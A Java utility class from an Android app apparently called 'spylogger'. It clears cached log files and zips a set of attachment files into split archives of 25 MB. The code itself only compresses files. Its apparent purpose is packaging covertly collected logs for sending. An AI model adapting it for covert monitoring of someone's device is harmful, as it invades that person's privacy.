package com.gravatasufoca.spylogger.utils;

import android.content.Context;

import com.gravatasufoca.spylogger.R;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.exception.ZipException;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.util.Zip4jConstants;

import java.io.File;
import java.io.FilenameFilter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class ZipAnexos {

    private final long MAX_FILE_SIZE = 26214400;
    private Map<String, File> anexos;
    private Context context;

	public ZipAnexos(Context context,Map<String, File> anexos) {
		this.anexos=anexos;
		this.context=context;
	}


	public List<String> getFiles(){
		   try {

			   File outputDir = context.getCacheDir();

			   final File[] files = outputDir.listFiles(new FilenameFilter() {

					@Override
					public boolean accept(File dir, String filename) {

						return filename.toLowerCase().startsWith("log.");
					}
				});
			   for (File f: files) f.delete();

			   	File z=new File(outputDir+"/"+context.getString(R.string.zipped_file_name));
			   	if(z.exists())
			   		z.delete();
	            // Initiate ZipFile object with the path/name of the zip file.
	            ZipFile zipFile = new ZipFile(outputDir+"/"+context.getString(R.string.zipped_file_name));

	            // Build the list of files to be added in the array list
	            // Objects of type File have to be added to the ArrayList
	            ArrayList<File> filesToAdd = new ArrayList<File>();

	            Set<String> keys=anexos.keySet();
	    		for(String key:keys){
	    			File anexo = anexos.get(key);
	    			if(anexo!=null)
	    				filesToAdd.add(anexo);
	    		}

	    		if(filesToAdd.size()==1){
					List<String> ff=new ArrayList<String>();
			    	File anexo = filesToAdd.get(0);
			    	if(anexo!=null)
			    		ff.add(anexo.getAbsolutePath());
			    		return ff;
				}

	            // Initiate Zip Parameters which define various properties such
	            // as compression method, etc.
	            ZipParameters parameters = new ZipParameters();

	            // set compression method to store compression
	            parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);

	            // Set the compression level. This value has to be in between 0 to 9
	            parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL );

	            // Create a split file by setting splitArchive parameter to true
	            // and specifying the splitLength. SplitLenth has to be greater than
	            // 65536 bytes
	            // Please note: If the zip file already exists, then this method throws an
	            // exception
	            zipFile.createZipFile(filesToAdd, parameters, true, MAX_FILE_SIZE);

	            return zipFile.getSplitZipFiles();

	        } catch (ZipException e) {
	            e.printStackTrace();
	        }
		   return Collections.emptyList();
	    }


}
